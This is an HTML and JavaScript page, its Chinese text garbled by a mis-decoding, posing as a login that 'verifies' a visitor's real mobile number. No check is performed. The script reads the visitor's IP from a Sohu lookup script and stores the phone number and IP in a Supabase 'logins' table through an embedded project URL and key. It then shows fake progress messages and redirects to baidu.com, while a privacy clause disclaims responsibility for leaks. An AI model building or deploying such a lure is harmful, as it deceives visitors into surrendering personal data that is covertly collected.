<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>æ¬¢è¿ç™»å½•</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root { --gold: #c6a35f; --bg: #0a0a0a; }
        body { font-family: -apple-system, sans-serif; background: var(--bg); color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .box { width: 85%; max-width: 320px; text-align: center; border: 1px solid #222; padding: 30px 20px; border-radius: 20px; background: #111; position: relative; }
        .radar { width: 60px; height: 60px; border: 2px solid var(--gold); border-radius: 50%; margin: 0 auto 20px; display: flex; justify-content: center; align-items: center; position: relative; }
        .radar::after { content: ""; width: 100%; height: 100%; border: 2px solid var(--gold); border-radius: 50%; position: absolute; animation: p 2s infinite; opacity: 0; }
        @keyframes p { 0% { transform: scale(1); opacity: 0.5; } 100% { transform: scale(1.6); opacity: 0; } }
        h2 { font-size: 19px; letter-spacing: 1px; margin-bottom: 10px; }
        p { font-size: 11px; color: #888; line-height: 1.6; margin-bottom: 25px; }
        .input-group { background: #1a1a1a; border: 1px solid #333; border-radius: 12px; margin-bottom: 10px; }
        input { width: 100%; background: transparent; border: none; padding: 15px 0; color: #fff; font-size: 20px; outline: none; text-align: center; letter-spacing: 1px; }
        .btn { width: 100%; padding: 16px; background: var(--gold); color: #000; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .btn:disabled { background: #444; color: #fff; cursor: not-allowed; }
        #log { font-size: 10px; color: var(--gold); margin-top: 15px; font-family: monospace; min-height: 14px; }
        #ip-display { font-size: 9px; color: #555; margin-bottom: 15px; font-family: monospace; }
        .privacy-link { font-size: 10px; color: #ffffff; text-decoration: none; margin-top: 15px; display: block; line-height: 1.4; }
        #privacy-text { display: none; font-size: 10px; color: #bbb; text-align: left; margin-top: 15px; padding: 10px; border-top: 1px dashed #333; line-height: 1.5; }
    </style>
</head>
<body>

<div class="box">
    <div id="ui-main">
        <div class="radar">ğŸ“¡</div>
        <h2>æ¬¢è¿ç™»å½•ç¥ç§˜ç½‘</h2>
        <p>è¯·è¾“å…¥æ‚¨æœ¬äººçš„çœŸå®æ‰‹æœºå·ï¼Œç³»ç»Ÿå°†è‡ªåŠ¨æ ¸éªŒå…¶çœŸå®æ€§</p>
        
        <div class="input-group">
            <input type="tel" id="u-phone" placeholder="è¾“å…¥11ä½æ‰‹æœºå·" maxlength="11">
        </div>
        <div id="ip-display">æ­£åœ¨æå–ç½‘å…³IP...</div>
        
        <button class="btn" id="btn-run" onclick="verify()">ç™»å½•</button>
        <div id="log"></div>
        
        <a href="javascript:void(0)" class="privacy-link" onclick="togglePrivacy()">æ ¸éªŒå³ä»£è¡¨æ‚¨åŒæ„ã€Šéšç§å…è´£æ¡æ¬¾ã€‹</a>
        <div id="privacy-text">
            æˆ‘ä»¬ç«­åŠ›ä¿æŠ¤æ‚¨çš„éšç§å®‰å…¨ï¼š<br>
            1. æ”¶é›†ä¿¡æ¯ä»…ç”¨äºèº«ä»½æ ¸éªŒï¼Œä¸ä¼šä¸»åŠ¨å‘ç¬¬ä¸‰æ–¹æ³„éœ²ã€‚<br>
            2. æˆ‘ä»¬çš„ç½‘é¡µé‡‡ç”¨HTPPSåè®®ä¿éšœæ‚¨çš„å·ç å®‰å…¨ã€‚<br>
            3. ä¸¥ç¦ä½¿ç”¨éæ³•æ‰‹æœºå·ï¼Œä¸¥ç¦ä½¿ç”¨åº§æœºå·ã€‚<br>
            4. ç½‘é¡µå†…å®¹ä»…ä¾›æŠ€æœ¯æµ‹è¯•ä»¥åŠå¨±ä¹ï¼Œä¸äº§ç”Ÿæ³•å¾‹æ•ˆåŠ›ã€‚<br>
            5. ç”¨æˆ·çš„ä¸ªäººä¿¡æ¯å°†è¢«ä¸¥æ ¼ä¿å¯†å¹¶å­˜å‚¨åœ¨ Supabase åŠ å¯†åº“ä¸­ã€‚<br>
            6. è·³è½¬åçš„é¡µé¢ä¸æœ¬ç½‘ç«™æ— å…³ï¼Œè¯·æ³¨æ„ç”„åˆ«ã€‚<br>
            7. æœ¬ç«™ç‚¹ä¸å¯¹å› ä½¿ç”¨æœ¬æœåŠ¡è€Œäº§ç”Ÿçš„ä»»ä½•ç›´æ¥æˆ–é—´æ¥æŸå¤±æ‰¿æ‹…è´£ä»»ã€‚<br>
            8. æ•°æ®åº“å¯èƒ½ä¼šè¢«é»‘å®¢æ”»å‡»ï¼Œè™½ç„¶æ³„éœ²æ¦‚ç‡æå°ï¼Œä½†è¯·æ³¨æ„ä¿æŠ¤ä¸ªäººä¿¡æ¯å®‰å…¨ï¼Œå¯¹äºæ³„éœ²çš„ä¸ªäººä¿¡æ¯æˆ‘ä»¬ä¸€æ¦‚ä¸è´Ÿè´£ä»»ã€‚<br>
            9. æœ¬æ¡æ¬¾æœ€ç»ˆè§£é‡Šæƒå½’æœ¬ç«™å¼€å‘è€…æ‰€æœ‰ã€‚
        </div>
    </div>
</div>

<script src="https://pv.sohu.com/cityjson?ie=utf-8"></script>

<script>
    const MY_URL = 'https://wzowdkjzitwjmacirofy.supabase.co'; 
    const MY_KEY = 'sb_publishable_vUkpj6iL4DNNwSH3S7w6xQ_qifNETLn';
    const REDIRECT_URL = 'https://www.baidu.com'; 

    const client = window.supabase.createClient(MY_URL, MY_KEY);
    
    // ä»æœç‹è„šæœ¬è·å–IP
    let userIP = (typeof returnCitySN !== 'undefined') ? returnCitySN["cip"] : ""//"æå–å¤±è´¥";
    document.getElementById('ip-display').innerText = ""//"æå–åˆ°ç½‘å…³IP: " + userIP;

    function togglePrivacy() {
        const t = document.getElementById('privacy-text');
        t.style.display = t.style.display === 'block' ? 'none' : 'block';
    }

    function isFakePattern(p) {
        const nums = p.split('').map(Number);
        for (let i = 0; i <= p.length - 4; i++) {
            const seg = nums.slice(i, i + 4);
            const d = seg[1] - seg[0];
            if (d === (seg[2] - seg[1]) && d === (seg[3] - seg[2])) {
                if (Math.abs(d) <= 6) return true; 
            }
            if (p.substring(i, i + 4).slice(0, 2) === p.substring(i+2, i + 4)) return true;
        }
        return false;
    }

    async function verify() {
        const phone = document.getElementById('u-phone').value;
        const log = document.getElementById('log');
        const btn = document.getElementById('btn-run');

        if (!/^1[3-9]\d{9}$/.test(phone)) { alert("âš ï¸ æ‰‹æœºå·æ ¼å¼ä¸ç¬¦åˆè§„èŒƒ"); return; }
        if (isFakePattern(phone)) { alert("âš ï¸ å®‰å…¨æ‹¦æˆªï¼šå…¨æ®µä½ç‰¹å¾æ‰«ææœªé€šè¿‡"); return; }

        btn.disabled = true;
        const steps = ["è¿æ¥ç½‘å…³...", "å°è£…IPæ•°æ®: " + userIP, "å¼ºåˆ¶å­˜å…¥æ•°æ®åº“...", "æ ¸éªŒå®Œæˆ"];
        
        for (let i = 0; i < steps.length; i++) {
            log.innerText = steps[i];
            
            // å…³é”®æ­¥éª¤ï¼šå¿…é¡»æˆåŠŸå†™å…¥æ•°æ®åº“åæ‰å…è®¸è·³è½¬
            if (i === 2) {
                const { error } = await client.from('logins').insert([
                    { 
                        phone: phone, 
                        ip_address: userIP,
                        created_at: new Date().toISOString()
                    }
                ]);
                
                if (error) {
                    console.error("æ•°æ®åº“å­˜å…¥å¼‚å¸¸:", error.message);
                    log.innerText = "æ•°æ®åŒæ­¥å¤±è´¥ï¼Œè¯·æ£€æŸ¥ç½‘ç»œ";
                    btn.disabled = false;
                    return; // å†™å…¥å¤±è´¥æ—¶ä¸è·³è½¬
                }
            }
            await new Promise(r => setTimeout(r, 800));
        }
        window.location.href = REDIRECT_URL;
    }
</script>
</body>
</html>